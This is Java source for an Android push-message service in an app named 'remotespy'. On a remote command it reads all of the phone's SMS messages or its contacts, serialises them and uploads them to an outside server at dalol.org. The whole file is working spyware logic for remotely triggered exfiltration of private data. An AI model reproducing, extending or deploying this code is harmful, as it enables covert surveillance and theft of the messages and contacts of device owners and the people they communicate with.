package org.dalol.remotespy.services;

import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import com.google.android.gms.gcm.GcmListenerService;
import com.google.gson.Gson;

import org.dalol.remotespy.ApiResponse;
import org.dalol.remotespy.CollectApi;
import org.dalol.remotespy.ContacT;
import org.dalol.remotespy.MessagesHelper;
import org.dalol.remotespy.Sms;

import java.util.ArrayList;
import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

import static android.content.ContentValues.TAG;

/**
 * @author Filippo Engidashet [filippo.eng@gmail.com]
 * @version 1.0.0
 * @since Sunday, 25/03/2018 at 13:38.
 */

public class GCMReceiveListenerService extends GcmListenerService {

    @Override
    public void onMessageReceived(String from, Bundle data) {
        String message = data.getString("message");
        Log.d(TAG, "From: " + from);
        Log.d(TAG, "Message: " + message);

        Toast.makeText(this, "Processing request...", Toast.LENGTH_SHORT).show();

//        if (from.startsWith("/topics/")) {
//            // message received from some topic.
//        } else {
//            // normal downstream message.
//        }

        Bundle notification = data.getBundle("notification");
        if (notification != null) {
            String body = notification.getString("body");
            if (body != null) {
                if (body.length() > 2) {
                    String[] split = body.split(",");
                    if("msg".equals(split[0])) {
                        ArrayList<Sms> allSms = new MessagesHelper().getAllSms(this);
                        sendToServer(allSms, split[1],  split[2]);
                    } else {
                        List<ContacT> contacTS = new MessagesHelper().fetchContacts(this);
                        sendToServer(contacTS, split[1],  split[2]);
                    }
                }
            }
        }



        //        if (notification != null) {
//            //msg, all-sms, filippo.eng@gmail.com
//            String body = notification.getBody();
//            if (body != null) {
//                if (body.length() > 2) {
//                    String[] split = body.split(",");
//                    if("msg".equals(split[0])) {
//                        ArrayList<Sms> allSms = new MessagesHelper().getAllSms(this);
//                        sendToServer(allSms, split[1],  split[2]);
//                    } else {
//                        List<ContacT> contacTS = new MessagesHelper().fetchContacts(this);
//                        sendToServer(contacTS, split[1],  split[2]);
//                    }
//                }
//            }
//        }
    }

    private void sendToServer(Object o, String subject, String email) {
        try {
            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl("http://www.dalol.org")
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();

            CollectApi collectApi = retrofit.create(CollectApi.class);
            Call<ApiResponse> call = collectApi.sendData(email, subject, new Gson().toJson(o));
            call.enqueue(new Callback<ApiResponse>() {
                @Override
                public void onResponse(Call<ApiResponse> call, Response<ApiResponse> response) {
                    if (response.isSuccessful()) {
                        ApiResponse apiResponse = response.body();
                        if (apiResponse != null) {
                            Toast.makeText(GCMReceiveListenerService.this, apiResponse.getMessage(), Toast.LENGTH_SHORT).show();
                        } else {
                            Toast.makeText(GCMReceiveListenerService.this, response.message(), Toast.LENGTH_SHORT).show();
                        }
                    } else {
                        Toast.makeText(GCMReceiveListenerService.this, response.message(), Toast.LENGTH_SHORT).show();
                    }
                }

                @Override
                public void onFailure(Call<ApiResponse> call, Throwable t) {
                    Toast.makeText(GCMReceiveListenerService.this, t.getMessage(), Toast.LENGTH_SHORT).show();
                }
            });

        } catch (Exception e) {
            System.err.println(e.getMessage());
        }
    }
}